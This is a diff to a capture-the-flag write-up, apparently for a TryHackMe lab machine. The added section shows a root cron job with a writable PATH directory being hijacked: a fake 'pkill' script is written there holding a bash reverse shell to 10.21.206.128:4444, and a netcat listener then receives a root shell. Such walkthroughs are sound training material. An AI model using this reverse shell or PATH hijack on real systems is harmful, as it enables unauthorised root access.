@@ -247,12 +247,11 @@ ls -sf /dev/null /home/lachlan/.bash_history
 
 And we found **lachlan** user's password.
 
-
 ## Connecting the machine using SSH
 
 ```bash
-❯ ssh lachlan@$IP        
-lachlan@10.10.42.44's password: 
+❯ ssh lachlan@$IP
+lachlan@10.10.42.44's password:
 Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
@@ -290,3 +289,61 @@ ssh lachlan@$IP /bin/bash
 ```
 
 And it does. Now we are not kicked from the machine.
+
+```bash
+ls -la
+ls -la
+total 36
+drwxr-xr-x 4 lachlan lachlan 4096 May  5  2022 .
+drwxr-xr-x 3 root    root    4096 May  5  2022 ..
+-rw-r--r-- 1 lachlan lachlan  168 May  5  2022 .bash_history
+-rw-r--r-- 1 lachlan lachlan  220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 lachlan lachlan 3771 Feb 25  2020 .bashrc
+drwxr-xr-x 2 lachlan lachlan 4096 May  5  2022 bin
+drwx------ 2 lachlan lachlan 4096 May  5  2022 .cache
+-rw-r--r-- 1 lachlan lachlan  807 Feb 25  2020 .profile
+-rw-r--r-- 1 lachlan lachlan   38 May  5  2022 user.txt
+cat user.txt
+thm{*****************************}
+```
+
+I see bin folder on the home directory and there is a script file in it. It should be related to cron jobs.
+
+```bash
+cat backup.sh
+# todo: pita website backup as requested by her majesty
+cat /etc/cron.d/persistence
+PATH=/home/lachlan/bin:/bin:/usr/bin
+# * * * * * root backup.sh
+* * * * * root /bin/sleep 1  && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
+* * * * * root /bin/sleep 11 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
+* * * * * root /bin/sleep 21 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
+* * * * * root /bin/sleep 31 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
+* * * * * root /bin/sleep 41 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
+* * * * * root /bin/sleep 51 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
+```
+
+I think we can inject our pkexec binary with reverse shell. Beacuse we have access to lachlan bin directory.
+
+Create our pkill with reverse shell using this command:
+
+```bash
+echo "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.21.206.128/4444 0>&1'" > pkill;chmod +x pkill
+```
+
+And we got reverse shell:
+
+```bash
+❯ nc -lvnp 4444
+Listening on 0.0.0.0 4444
+Connection received on 10.10.42.44 53902
+bash: cannot set terminal process group (28694): Inappropriate ioctl for device
+bash: no job control in this shell
+root@b2r:~# ls
+ls
+root.txt
+snap
+root@b2r:~# cat root.txt
+cat root.txt
+thm{**********************************}
+```
